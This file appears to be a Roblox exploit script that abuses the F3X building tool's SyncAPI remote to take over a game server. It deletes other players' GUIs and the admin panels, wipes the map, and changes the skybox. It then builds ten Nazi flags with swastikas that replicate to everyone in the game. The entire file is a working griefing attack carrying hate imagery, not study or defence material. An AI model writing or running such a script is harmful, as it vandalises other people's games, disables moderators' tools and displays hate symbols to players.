local Remote = game:GetService("ReplicatedStorage"):WaitForChild("F3X"):WaitForChild("SyncAPI")
local skyboxID = "82300491283340"

-- Delete ALL admin panels completely
for _, v in ipairs(game.Players.LocalPlayer:WaitForChild("PlayerGui"):GetChildren()) do
    if v:IsA("ScreenGui") then
        v:Destroy()
    end
end

for _, v in ipairs(game:GetService("StarterGui"):GetChildren()) do
    if v:IsA("ScreenGui") then
        v:Destroy()
    end
end

-- Delete all GUIs from all players
for _, player in ipairs(game.Players:GetPlayers()) do
    for _, v in ipairs(player:FindFirstChild("PlayerGui"):GetChildren()) do
        if v:IsA("ScreenGui") then
            v:Destroy()
        end
    end
end

-- Delete admin panel from CoreGui (if exists)
for _, v in ipairs(game:GetService("CoreGui"):GetChildren()) do
    if v:IsA("ScreenGui") and (v.Name:lower():find("admin") or v.Name:lower():find("kohl") or v.Name:lower():find("hd")) then
        v:Destroy()
    end
end

-- Clear existing map
for _, v in ipairs(workspace:GetChildren()) do
    if v:IsA("BasePart") or v:IsA("Model") then
        v:Destroy()
    end
end

-- Skybox change
local Lighting = game:GetService("Lighting")
for _, face in ipairs({"SkyboxUp", "SkyboxDown", "SkyboxLeft", "SkyboxRight", "SkyboxFront", "SkyboxBack"}) do
    Lighting[face] = "rbxassetid://" .. skyboxID
end

-- Create BasePlate
local baseplate = Instance.new("Part")
baseplate.Size = Vector3.new(500, 5, 500)
baseplate.Anchored = true
baseplate.CFrame = CFrame.new(0, -2.5, 0)
baseplate.BrickColor = BrickColor.new("Dark grey")
baseplate.Parent = workspace
Remote:FireServer("Create", baseplate)

-- Create 10 Nazi flags (5 right, 5 left)
local function createFlag(xPos)
    local pole = Instance.new("Part")
    pole.Size = Vector3.new(2, 50, 2)
    pole.Anchored = true
    pole.CFrame = CFrame.new(xPos, 25, 0)
    pole.BrickColor = BrickColor.new("Dark stone grey")
    pole.Parent = workspace
    Remote:FireServer("Create", pole)
    
    local flagBase = Instance.new("Part")
    flagBase.Size = Vector3.new(30, 20, 0.5)
    flagBase.Anchored = true
    flagBase.CFrame = CFrame.new(xPos + 15, 30, 0)
    flagBase.BrickColor = BrickColor.new("Really red")
    flagBase.Parent = workspace
    Remote:FireServer("Create", flagBase)
    
    local whiteCircle = Instance.new("Part")
    whiteCircle.Size = Vector3.new(10, 10, 0.6)
    whiteCircle.Anchored = true
    whiteCircle.CFrame = CFrame.new(xPos + 15, 30, 0.1)
    whiteCircle.Shape = Enum.PartType.Cylinder
    whiteCircle.BrickColor = BrickColor.new("White")
    whiteCircle.Parent = workspace
    Remote:FireServer("Create", whiteCircle)
    
    local swastika1 = Instance.new("Part")
    swastika1.Size = Vector3.new(4, 1.5, 0.7)
    swastika1.Anchored = true
    swastika1.CFrame = CFrame.new(xPos + 15, 30, 0.2)
    swastika1.BrickColor = BrickColor.new("Black")
    swastika1.Parent = workspace
    Remote:FireServer("Create", swastika1)
    
    local swastika2 = Instance.new("Part")
    swastika2.Size = Vector3.new(1.5, 4, 0.7)
    swastika2.Anchored = true
    swastika2.CFrame = CFrame.new(xPos + 15, 30, 0.2)
    swastika2.BrickColor = BrickColor.new("Black")
    swastika2.Parent = workspace
    Remote:FireServer("Create", swastika2)
    
    local swastika3 = Instance.new("Part")
    swastika3.Size = Vector3.new(1.5, 1.5, 0.7)
    swastika3.Anchored = true
    swastika3.CFrame = CFrame.new(xPos + 13.5, 28.5, 0.2)
    swastika3.BrickColor = BrickColor.new("Black")
    swastika3.Parent = workspace
    Remote:FireServer("Create", swastika3)
    
    local swastika4 = Instance.new("Part")
    swastika4.Size = Vector3.new(1.5, 1.5, 0.7)
    swastika4.Anchored = true
    swastika4.CFrame = CFrame.new(xPos + 16.5, 31.5, 0.2)
    swastika4.BrickColor = BrickColor.new("Black")
    swastika4.Parent = workspace
    Remote:FireServer("Create", swastika4)
end

-- 5 flags on left (negative X)
for i = 1, 5 do
    local xPos = -225 + (i - 1) * 50
    createFlag(xPos)
    task.wait(0.05)
end

-- 5 flags on right (positive X)
for i = 1, 5 do
    local xPos = 25 + (i - 1) * 50
    createFlag(xPos)
    task.wait(0.05)
end

-- Create giant skybox part
local skyPart = Instance.new("Part")
skyPart.Size = Vector3.new(2000, 2000, 2000)
skyPart.Anchored = true
skyPart.CFrame = CFrame.new(0, 1000, 0)
skyPart.Parent = workspace

for _, face in ipairs({Enum.NormalId.Front, Enum.NormalId.Back, Enum.NormalId.Left, Enum.NormalId.Right, Enum.NormalId.Top, Enum.NormalId.Bottom}) do
    local decal = Instance.new("Decal")
    decal.Texture = "rbxassetid://" .. skyboxID
    decal.Face = face
    decal.Parent = skyPart
end

Remote:FireServer("Create", skyPart)
